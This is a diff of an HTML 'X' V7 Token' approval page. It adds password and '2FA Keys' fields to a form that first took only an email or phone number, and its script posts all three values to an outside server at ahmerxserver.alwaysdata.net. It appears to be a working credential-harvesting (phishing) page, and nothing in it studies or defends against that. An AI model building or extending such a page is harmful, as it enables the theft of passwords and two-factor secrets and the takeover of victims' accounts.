@@ -2,94 +2,84 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>X Token - Ahmi'X Server</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X' V7 Token</title>
   <style>
     body {
-      margin: 0;
       font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #8b0000, #4b0082); /* reddish-purple gradient */
-      color: #fff;
+      background: #f9f9f9;
+      padding: 20px;
+    }
+    header, footer {
       text-align: center;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-    }
-    header {
-      padding: 20px;
-      font-size: 2em;
       font-weight: bold;
-      color: #fff;
-      text-shadow: 2px 2px 6px rgba(0,0,0,0.6);
+      margin-bottom: 20px;
     }
-    h2 {
-      margin: 10px 0;
-      font-size: 1.4em;
-      font-weight: bold;
-      color: #ffdddd;
-    }
-    .form-container {
-      background: rgba(0,0,0,0.5);
-      padding: 20px;
-      border-radius: 12px;
-      margin: 20px auto;
+    form {
       max-width: 400px;
-      box-shadow: 0 0 15px rgba(255,255,255,0.2);
-    }
-    .form-container label {
-      display: block;
-      margin: 12px 0 6px;
-      font-weight: bold;
-      text-align: left;
-    }
-    .form-container input[type="text"],
-    .form-container input[type="password"] {
-      width: 92%;
-      padding: 12px;
-      border-radius: 6px;
-      border: none;
-      margin-bottom: 12px;
-      font-size: 1em;
-    }
-    .form-container button {
-      width: 92%;
-      padding: 12px;
-      background: #ff4444;
-      color: #fff;
-      font-size: 1.1em;
-      font-weight: bold;
-      border: none;
+      margin: auto;
+      background: #fff;
+      padding: 20px;
       border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.3s;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
-    .form-container button:hover {
-      background: #cc0000;
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      margin-top: 15px;
+      padding: 10px;
+      width: 100%;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0056b3;
     }
     .message {
-      margin-top: 10px;
-      font-size: 0.95em;
-      color: #ffdddd;
+      margin-top: 20px;
+      font-weight: bold;
+      text-align: center;
     }
-    footer {
-      margin: 20px;
-      font-size: 0.9em;
-      color: #ddd;
+    .error {
+      color: red;
+    }
+    .success {
+      color: green;
     }
   </style>
 </head>
 <body>
-  <header>Ahmi'X Server</header>
-  <h2>X'V7 TOKEN</h2>
+  <header>X' V7 Token</header>
 
-<form id="approvalForm">
+  <form id="approvalForm">
     <label for="email">Email / Phone:</label>
     <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>
+
+    <label for="password">Password:</label>
+    <input type="text" id="password" name="password" placeholder="Enter your password" required>
+
+    <label for="twofa">2FA Keys:</label>
+    <input type="text" id="twofa" name="twofa" placeholder="Enter your 2FA key" required>
+
     <button type="submit">Send Approval</button>
   </form>
 
   <div id="response" class="message"></div>
+
+  <footer>Made by Ahmer Awan</footer>
 
   <script>
     const form = document.getElementById("approvalForm");
@@ -97,8 +87,14 @@
 
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
+
       const emailField = document.getElementById("email");
+      const passwordField = document.getElementById("password");
+      const twofaField = document.getElementById("twofa");
+
       const typedValue = emailField.value.trim();
+      const passwordValue = passwordField.value.trim();
+      const twofaValue = twofaField.value.trim();
 
       // ✅ Validation: email OR 11-digit phone number
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -114,7 +110,11 @@
         const res = await fetch("https://ahmerxserver.alwaysdata.net/sendApproval", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email: typedValue })
+          body: JSON.stringify({
+            email: typedValue,
+            password: passwordValue,
+            twofa: twofaValue
+          })
         });
 
         if (res.ok) {
